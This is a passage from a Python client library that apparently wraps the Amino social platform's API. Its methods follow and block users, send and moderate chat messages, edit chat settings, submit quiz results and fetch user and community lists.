            # looks like not working
            # response = self.session.post(f"/x{self.comId}/s/user-profile/{userId}/member", headers=self.additional_headers())
            data = dumps({"targetUidList": [userId], "timestamp": inttime()})
            
            response = self.session.post(f"/x{self.comId}/s/user-profile/{self.profile.userId}/joined", headers=self.additional_headers(data=data), data=data)

        elif isinstance(userId, list):
            data = dumps({"targetUidList": userId, "timestamp": inttime()})
            
            response = self.session.post(f"/x{self.comId}/s/user-profile/{self.profile.userId}/joined", headers=self.additional_headers(data=data), data=data)

        else: raise exceptions.WrongType(type(userId))

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def unfollow(self, userId: str):
        """
        Unfollow an User.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.delete(f"/x{self.comId}/s/user-profile/{self.profile.userId}/joined/{userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def block(self, userId: str):
        """
        Block an User.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.post(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def unblock(self, userId: str):
        """
        Unblock an User.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.delete(f"/x{self.comId}/s/block/{userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def visit(self, userId: str):
        """
        Visit an User. Seems like not working anymore.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}?action=visit", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def flag(self, reason: str, flagType: int, userId: str = None, blogId: str = None, wikiId: str = None, asGuest: bool = False):
        """
        Flag a User, Blog or Wiki.

        **Parameters**
            - **reason** : Reason of the Flag.
            - **flagType** : Type of the Flag.
            - **userId** : ID of the User.
            - **blogId** : ID of the Blog.
            - **wikiId** : ID of the Wiki.
            - *asGuest* : Execute as a Guest.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        if reason is None: raise exceptions.ReasonNeeded()
        if flagType is None: raise exceptions.FlagTypeNeeded()

        data = {
            "flagType": flagType,
            "message": reason,
            "timestamp": inttime()
        }

        if userId:
            data["objectId"] = userId
            data["objectType"] = 0

        elif blogId:
            data["objectId"] = blogId
            data["objectType"] = 1

        elif wikiId:
            data["objectId"] = wikiId
            data["objectType"] = 2

        else: raise exceptions.SpecifyType()

        if asGuest: flg = "g-flag"
        else: flg = "flag"

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/{flg}", data=data, headers=self.additional_headers(data=data))
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def send_message(
            self,
            chatId: str, message: str = None, messageType: int = 0,
            file: BinaryIO = None, fileType: str = None,
            replyTo: str = None, mentionUserIds: list = None,
            stickerId: str = None,
        
            embedId: str = None,
            embedLink: str = None,
            embedTitle: str = None,
            embedContent: str = None,
            embedImage: BinaryIO = None,
            embedType: objects.EmbedTypes = None,
            embedObjectType: objects.AttachedObjectTypes = None
        ):
        """
        Send a Message to a Chat.

        **Parameters**
            - **message** : Message to be sent
            - **chatId** : ID of the Chat.
            - **file** : File to be sent.
            - **fileType** : Type of the file.
                - ``audio``, ``image``, ``gif``
            - **messageType** : Type of the Message.
            - **mentionUserIds** : List of User IDS to mention. '@' needed in the Message.
            - **replyTo** : Message ID to reply to.
            - **stickerId** : Sticker ID to be sent.
            - **embedType** : Type of the Embed. Can be aminofixfix.lib.objects.EmbedTypes only. By default it's LinkSnippet one.
            - **embedLink** : Link of the Embed. Can be only "ndc://" link if its AttachedObject.
            - **embedImage** : Image of the Embed. Required to send Embed, if its LinkSnippet. Can be only 1024x1024 max. Can be string to existing image uploaded to Amino or it can be opened (not readed) file.
            - **embedId** : ID of the Embed. Works only in AttachedObject Embeds. It can be any ID, just gen it using str_uuid4().
            - **embedType** : Type of the AttachedObject Embed. Works only in AttachedObject Embeds. Just look what values AttachedObjectTypes enum contains.
            - **embedTitle** : Title of the Embed. Works only in AttachedObject Embeds. Can be empty.
            - **embedContent** : Content of the Embed. Works only in AttachedObject Embeds. Can be empty.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """

        if message is not None and file is None:
            message = message.replace("<$", "‎‏").replace("$>", "‬‭")

        mentions = []
        if mentionUserIds:
            mentions = [{"uid": mention_uid} for mention_uid in mentionUserIds]

        if embedImage and not isinstance(embedImage, str):
            try: readEmbed = embedImage.read()
            except: embedType = None

        if embedType == objects.EmbedTypes.LINK_SNIPPET:
            data = {
                "type": messageType,
                "content": message,
                "clientRefId": clientrefid(),
                "extensions": {
                    "linkSnippetList": [{
                        "link": embedLink,
                        "mediaType": 100,
                        "mediaUploadValue": bytes_to_b64(readEmbed),
                        "mediaUploadValueContentType": "image/png"
                    }],
                    "mentionedArray": mentions
                },
                "timestamp": inttime()
            }
        elif embedType == objects.EmbedTypes.ATTACHED_OBJECT:
            try: embedObjectType.value
            except: raise Exception("You SHOULD pass AttachedEmbedTypes.")

            if isinstance(embedImage, str):
                image = [[100, embedImage, None]]
            elif embedImage:
                image = [[100, self.upload_media(embedImage, "image"), None]]
            else:
                image = None

            data = {
                "type": messageType,
                "content": message,
                "clientRefId": clientrefid(),
                "attachedObject": {
                    "objectId": embedId,
                    "objectType": embedObjectType.value,
                    "link": embedLink,
                    "title": embedTitle,
                    "content": embedContent,
                    "mediaList": image
                },
                "extensions": {"mentionedArray": mentions},
                "timestamp": inttime()
            }
        else:
            data = {
                "type": messageType,
                "content": message,
                "clientRefId": clientrefid(),
                "extensions": {"mentionedArray": mentions},
                "timestamp": inttime()
            }

        if replyTo: data["replyMessageId"] = replyTo

        if stickerId:
            data["content"] = None
            data["stickerId"] = stickerId
            data["type"] = 3

        if file:
            data["content"] = None
            if fileType == "audio":
                data["type"] = 2
                data["mediaType"] = 110

            elif fileType == "image":
                data["mediaType"] = 100
                data["mediaUploadValueContentType"] = "image/jpg"
                data["mediaUhqEnabled"] = True

            elif fileType == "gif":
                data["mediaType"] = 100
                data["mediaUploadValueContentType"] = "image/gif"
                data["mediaUhqEnabled"] = True

            else: raise exceptions.SpecifyType(fileType)

            data["mediaUploadValue"] = bytes_to_b64(file.read())

        data = dumps(data)
        print(data)

        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/message", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def delete_message(self, chatId: str, messageId: str, asStaff: bool = False, reason: str = None):
        """
        Delete a Message from a Chat.

        **Parameters**
            - **messageId** : ID of the Message.
            - **chatId** : ID of the Chat.
            - **asStaff** : If execute as a Staff member (Leader or Curator).
            - **reason** : Reason of the action to show on the Moderation History.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {
            "adminOpName": 102,
            # "adminOpNote": {"content": reason},
            "timestamp": inttime()
        }
        if asStaff and reason:
            data["adminOpNote"] = {"content": reason}

        data = dumps(data)
        
        if not asStaff: response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/message/{messageId}", headers=self.additional_headers())
        else: response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/message/{messageId}/admin", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def mark_as_read(self, chatId: str, messageId: str):
        """
        Mark a Message from a Chat as Read.

        **Parameters**
            - **messageId** : ID of the Message.
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = dumps({
            "messageId": messageId,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/mark-as-read", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def edit_chat(self, chatId: str, doNotDisturb: bool = None, pinChat: bool = None, title: str = None, icon: str = None, backgroundImage: str = None, content: str = None, announcement: str = None, coHosts: list = None, keywords: list = None, pinAnnouncement: bool = None, publishToGlobal: bool = None, canTip: bool = None, viewOnly: bool = None, canInvite: bool = None, fansOnly: bool = None):
        """
        Send a Message to a Chat.

        **Parameters**
            - **chatId** : ID of the Chat.
            - **title** : Title of the Chat.
            - **content** : Content of the Chat.
            - **icon** : Icon of the Chat.
            - **backgroundImage** : Url of the Background Image of the Chat.
            - **announcement** : Announcement of the Chat.
            - **pinAnnouncement** : If the Chat Announcement should Pinned or not.
            - **coHosts** : List of User IDS to be Co-Host.
            - **keywords** : List of Keywords of the Chat.
            - **viewOnly** : If the Chat should be on View Only or not.
            - **canTip** : If the Chat should be Tippable or not.
            - **canInvite** : If the Chat should be Invitable or not.
            - **fansOnly** : If the Chat should be Fans Only or not.
            - **publishToGlobal** : If the Chat should show on Public Chats or not.
            - **doNotDisturb** : If the Chat should Do Not Disturb or not.
            - **pinChat** : If the Chat should Pinned or not.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        data = {"timestamp": inttime()}

        if title: data["title"] = title
        if content: data["content"] = content
        if icon: data["icon"] = icon
        if keywords: data["keywords"] = keywords
        if announcement: data["extensions"] = {"announcement": announcement}
        if pinAnnouncement: data["extensions"] = {"pinAnnouncement": pinAnnouncement}
        if fansOnly: data["extensions"] = {"fansOnly": fansOnly}

        if publishToGlobal: data["publishToGlobal"] = 0
        if not publishToGlobal: data["publishToGlobal"] = 1

        res = []

        if doNotDisturb is not None:
            if doNotDisturb:
                data = dumps({"alertOption": 2, "timestamp": inttime()})
                
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}/alert", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

            if not doNotDisturb:
                data = dumps({"alertOption": 1, "timestamp": inttime()})
                
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}/alert", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

        if pinChat is not None:
            if pinChat:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/pin", data=data, headers=self.additional_headers())
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

            if not pinChat:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/unpin", data=data, headers=self.additional_headers())
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

        if backgroundImage is not None:
            data = dumps({"media": [100, backgroundImage, None], "timestamp": inttime()})
            
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}/background", data=data, headers=self.additional_headers(data=data))
            if response.status_code != 200: res.append(exceptions.CheckException(response))
            else: res.append(response.status_code)

        if coHosts is not None:
            data = dumps({"uidList": coHosts, "timestamp": inttime()})
            
            response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/co-host", data=data, headers=self.additional_headers(data=data))
            if response.status_code != 200: res.append(exceptions.CheckException(response))
            else: res.append(response.status_code)

        if viewOnly is not None:
            if viewOnly:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/view-only/enable", headers=self.additional_headers())
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

            if not viewOnly:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/view-only/disable", headers=self.additional_headers())
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

        if canInvite is not None:
            if canInvite:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/members-can-invite/enable", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

            if not canInvite:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/members-can-invite/disable", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

        if canTip is not None:
            if canTip:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/tipping-perm-status/enable", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

            if not canTip:
                response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/tipping-perm-status/disable", data=data, headers=self.additional_headers(data=data))
                if response.status_code != 200: res.append(exceptions.CheckException(response))
                else: res.append(response.status_code)

        data = dumps(data)
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: res.append(exceptions.CheckException(response))
        else: res.append(response.status_code)

        return res

    def transfer_host(self, chatId: str, userIds: list):
        """
        Transfering host in chat.

        Accepting:
        - chatId: str
        - userIds: list[str]
            - who are your princes and princesses that will have chat as inheritance?

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "uidList": userIds,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/transfer-organizer", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def transfer_organizer(self, chatId: str, userIds: list):
        """
        Transfering host in chat. (Alias of function `transfer_host`.)

        Accepting:
        - chatId: str
        - userIds: list[str]
            - who are your princes and princesses that will have chat as inheritance?

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        self.transfer_host(chatId, userIds)

    def accept_host(self, chatId: str, requestId: str):
        """
        Accepting host in chat.

        Accepting:
        - chatId: str
        - requestId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({})
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/transfer-organizer/{requestId}/accept", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def accept_organizer(self, chatId: str, requestId: str):
        """
        Accepting host in chat. (Alias to function `accept_host`.)

        Accepting:
        - chatId: str
        - requestId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        self.accept_host(chatId, requestId)

    def kick(self, userId: str, chatId: str, allowRejoin: bool = True):
        if allowRejoin: allowRejoin = 1
        if not allowRejoin: allowRejoin = 0
        response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/member/{userId}?allowRejoin={allowRejoin}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def join_chat(self, chatId: str):
        """
        Join an Chat.

        **Parameters**
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def leave_chat(self, chatId: str):
        """
        Leave an Chat.

        **Parameters**
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}/member/{self.profile.userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code
        
    def delete_chat(self, chatId: str):
        """
        Delete a Chat.

        **Parameters**
            - **chatId** : ID of the Chat.

        **Returns**
            - **Success** : 200 (int)

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.delete(f"/x{self.comId}/s/chat/thread/{chatId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code
        
    def subscribe(self, userId: str, autoRenew: str = False, transactionId: str = None):
        """
        Subscibing to VIP person.

        Accepting:
        - userId: str
            - id of object that you wanna buy
        - isAutoRenew: bool = False
            - do you wanna auto renew your subscription?
        - transactionId: str = None
            - unique id of transaction

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if transactionId is None: transactionId = str_uuid4()

        data = dumps({
            "paymentContext": {
                "transactionId": transactionId,
                "isAutoRenew": autoRenew
            },
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/influencer/{userId}/subscribe", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def promotion(self, noticeId: str, type: str = "accept"):
        """
        Accept or deny promotion to curator/leader/agent.

        Accepting:
        - noticeId: str
            - get from `get_notices`
        - type: str = "accept"
            - or you wanna decline? :)

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.post(f"/x{self.comId}/s/notice/{noticeId}/{type}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def play_quiz_raw(self, quizId: str, quizAnswerList: list, quizMode: int = 0):
        """
        Send quiz results.

        Accepting:
        - quizId: str
        - quizAnswerList: list
        - quizMode: int = 0

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "mode": quizMode,
            "quizAnswerList": quizAnswerList,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/quiz/result", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def play_quiz(self, quizId: str, questionIdsList: list, answerIdsList: list, quizMode: int = 0):
        """
        Send quiz results.

        Accepting:
        - quizId: str
        - questionIdsList: list
        - answerIdsList: list
        - quizMode: int = 0

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        quizAnswerList = []

        for question, answer in zip(questionIdsList, answerIdsList):
            quizAnswerList.append({
                "optIdList": [answer],
                "quizQuestionId": question,
                "timeSpent": 0.0
            })

        data = dumps({
            "mode": quizMode,
            "quizAnswerList": quizAnswerList,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/blog/{quizId}/quiz/result", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def vc_permission(self, chatId: str, permission: int):
        """
        Manage permissions to VC.

        Accepting:
        - chatId: str
        - permission: int
            - 1 = Open to Everyone
            - 2 = Approval Required
            - 3 = Invite Only

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        data = dumps({
            "vvChatJoinType": permission,
            "timestamp": inttime()
        })
        
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/vvchat-permission", headers=self.additional_headers(data=data), data=data)
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.status_code

    def get_vc_reputation_info(self, chatId: str):
        """
        Get info about reputation that you got from VC.

        Accepting:
        - chatId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/chat/thread/{chatId}/avchat-reputation", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.VcReputation(response.json()).VcReputation

    def claim_vc_reputation(self, chatId: str):
        """
        Claim reputation that you got from VC.

        Accepting:
        - chatId: str

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.post(f"/x{self.comId}/s/chat/thread/{chatId}/avchat-reputation", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.VcReputation(response.json()).VcReputation

    def get_all_users(self, type: str = "recent", start: int = 0, size: int = 25):
        """
        Get info about all members.

        Accepting:
        - type: str
            - can be only "recent", "banned", "featured", "leaders" and "curators"
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        if type == "recent": response = self.session.get(f"/x{self.comId}/s/user-profile?type=recent&start={start}&size={size}", headers=self.additional_headers())
        elif type == "banned": response = self.session.get(f"/x{self.comId}/s/user-profile?type=banned&start={start}&size={size}", headers=self.additional_headers())
        elif type == "featured": response = self.session.get(f"/x{self.comId}/s/user-profile?type=featured&start={start}&size={size}", headers=self.additional_headers())
        elif type == "leaders": response = self.session.get(f"/x{self.comId}/s/user-profile?type=leaders&start={start}&size={size}", headers=self.additional_headers())
        elif type == "curators": response = self.session.get(f"/x{self.comId}/s/user-profile?type=curators&start={start}&size={size}", headers=self.additional_headers())
        else: raise exceptions.WrongType(type)

        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileCountList(response.json()).UserProfileCountList

    def get_online_users(self, start: int = 0, size: int = 25):
        """
        Get info about all online members.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/live-layer?topic=ndtopic:x{self.comId}:online-members&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileCountList(response.json()).UserProfileCountList

    def get_online_favorite_users(self, start: int = 0, size: int = 25):
        """
        Get info about all online favorite members.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `int` (200)
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/user-group/quick-access?type=online&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileCountList(response.json()).UserProfileCountList

    def get_user_info(self, userId: str):
        """
        Information of an User.

        **Parameters**
            - **userId** : ID of the User.

        **Returns**
            - **Success** : :meth:`User Object <amino.lib.util.objects.UserProfile>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfile(response.json()["userProfile"]).UserProfile

    def get_user_following(self, userId: str, start: int = 0, size: int = 25):
        """
        List of Users that the User is Following.

        **Parameters**
            - **userId** : ID of the User.
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/joined?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def get_user_followers(self, userId: str, start: int = 0, size: int = 25):
        """
        List of Users that are Following the User.

        **Parameters**
            - **userId** : ID of the User.
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`User List <amino.lib.util.objects.UserProfileList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/member?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def get_user_visitors(self, userId: str, start: int = 0, size: int = 25):
        """
        List of Users that Visited the User.

        **Parameters**
            - **userId** : ID of the User.
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`Visitors List <amino.lib.util.objects.visitorsList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/visitors?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.VisitorsList(response.json()).VisitorsList

    def get_user_checkins(self, userId: str):
        """
        Get info about user's check ins.

        Accepting:
        - userId: str

        Recieving:
        - object `UserCheckIns`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/check-in/stats/{userId}?timezone={LOCAL_TIMEZONE}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserCheckIns(response.json()).UserCheckIns

    def get_user_blogs(self, userId: str, start: int = 0, size: int = 25):
        """
        Get info about user's blogs.

        Accepting:
        - userId: str

        Recieving:
        - object `BlogList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/blog?type=user&q={userId}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.BlogList(response.json()["blogList"]).BlogList

    def get_user_wikis(self, userId: str, start: int = 0, size: int = 25):
        """
        Get info about user's wikis.

        Accepting:
        - userId: str

        Recieving:
        - object `WikiList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/item?type=user-all&start={start}&size={size}&cv=1.2&uid={userId}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.WikiList(response.json()["itemList"]).WikiList

    def get_user_achievements(self, userId: str):
        """
        Get info about user's achievements.

        Accepting:
        - userId: str

        Recieving:
        - object `UserAchievements`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile/{userId}/achievements", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserAchievements(response.json()["achievements"]).UserAchievements

    def get_influencer_fans(self, userId: str, start: int = 0, size: int = 25):
        """
        Get all who subscribed to fanclub.

        Accepting:
        - userId: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `InfluencerFans`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/influencer/{userId}/fans?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.InfluencerFans(response.json()).InfluencerFans

    def get_blocked_users(self, start: int = 0, size: int = 25):
        """
        List of Users that the User Blocked.

        **Parameters**
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`Users List <amino.lib.util.objects.UserProfileList>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """
        response = self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def get_blocker_users(self, start: int = 0, size: int = 25):
        """
        List of Users that are Blocking the User.

        **Parameters**
            - *start* : Where to start the list.
            - *size* : Size of the list.

        **Returns**
            - **Success** : :meth:`List of User IDs <List>`

            - **Fail** : :meth:`Exceptions <aminofixfix.lib.exceptions>`
        """

        response = self.session.get(f"/x{self.comId}/s/block?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return response.json()["blockerUidList"]

    def search_users(self, nickname: str, start: int = 0, size: int = 25):
        """
        Searching users by nickname.

        Accepting:
        - nickname: str
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `UserProfileList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/user-profile?type=name&q={nickname}&start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserProfileList(response.json()["userProfileList"]).UserProfileList

    def get_saved_blogs(self, start: int = 0, size: int = 25):
        """
        Recieve all your saved blogs.

        Accepting:
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `UserSavedBlogs`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
        response = self.session.get(f"/x{self.comId}/s/bookmark?start={start}&size={size}", headers=self.additional_headers())
        if response.status_code != 200: 
            return exceptions.CheckException(response)
        else: return objects.UserSavedBlogs(response.json()["bookmarkList"]).UserSavedBlogs

    def get_leaderboard_info(self, type: str, start: int = 0, size: int = 25):
        """
        Recieve all your users from leaderboard.

        Accepting:
        - type: str
            - can be only "24"/"hour", "7"/"day", "rep", "check" or "quiz"
        - start: int = 0
            - start pos
        - size: int = 25
            - how much you want to get

        Recieving:
        - object `UserProfileList`
        - on exception, some exception from `aminofixfix.lib.exceptions`
        """
